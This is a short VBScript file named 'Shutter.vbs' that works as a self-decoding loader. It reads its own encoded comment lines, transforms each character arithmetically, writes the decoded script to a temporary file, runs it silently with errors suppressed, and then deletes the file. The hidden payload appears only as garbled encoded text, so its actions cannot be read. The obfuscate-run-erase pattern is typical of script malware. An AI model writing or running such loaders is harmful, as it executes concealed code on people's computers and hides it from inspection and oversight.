On Error Resume Next
Set objWSH = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFSO1 = CreateObject("Scripting.FileSystemObject")
Set objTCode = objFSO1.CreateTextFile("tmp.vbs", TRUE)
Set objCode = objFSO.OpenTextFile("Shutter.vbs")
Do Until objCode.AtEndOfStream
strTMP = objCode.ReadLine
For x = 1 to Len(strTMP)
strCR = Mid(strTMP, x, 1)
If strCR <> "'" Then
If Asc(strCR) < 32 Then
intCR = ((Asc(strCR) + 255) / 2) - 7
Else
intCR = (Asc(strCR) / 2) - 7
End If
strCR = chr(intCR)
End If
strCode = strCode & strCR
Next
If Mid(strCode, 1, 1) = "'" Then
objTCode.WriteLine Mid(strCode, 2, Len(strCode) - 1)
End If
strCode = VBNullString
Loop
objTCode.Close
objWSH.run "tmp.vbs"
wscript.sleep 1000
objFSO.DeleteFile "tmp.vbs", TRUE
'���N��⼴�fN���fN��򔨖fN������
'
'���N��⼴�NN�N������������^R�������j�����R`
'��򔨖N�NR��������Nh�Nh�N��R
'������N�NR�����������N���������N��N�������N���������N�������N��N���N�������jN��N���N��������N���N��������N��N���N��N���jN�������N��N�����N����N������N��N���N�������N�����N��������jN������N��R
'
'��N�����N���N��NRP�����PR
'�������j����NR��N���N������N�����N\P�����P\R
'�������j����NR������N�����N���R
'���N�N�������j�����j��������
'
'��N���N��NRP�����PRN����
'��⼴�j���N������NZN���NZNRNh�NprnNh�NRNZN���^tv`NZN������NZN���^tv`NZNRNh�R
'\������N���
'��⼴�j���NR����NRNZN���NZNRNh�R
'��⼴�j���NR�����R
'�������j�����Nrnnn
'��⼴�j�����������NR������N�������N����������R
'�������j�����Npnnn
'��⼴�j�������N���
'���N��
'����
'
'
'���N��⼴�N�N�������
'�������j����
'
'\\�hh�N������N�������N�N��������N�hh�\\
'\\�hh�N�����ب��N�������N���jN�hh�\\
'\\�hh�N���j����������������j���N�hh�\\
